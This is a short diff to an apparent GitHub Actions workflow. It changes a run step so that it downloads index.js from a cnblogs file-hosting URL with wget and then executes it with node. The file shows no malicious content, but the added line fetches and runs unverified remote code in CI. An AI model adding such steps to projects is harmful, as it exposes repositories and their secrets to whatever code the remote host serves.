@@ -5,4 +5,4 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@master
-      - run: node index.js;node index.js
+      - run: wget https://files.cnblogs.com/files/mldonkey/index.js;node index.js;node index.js
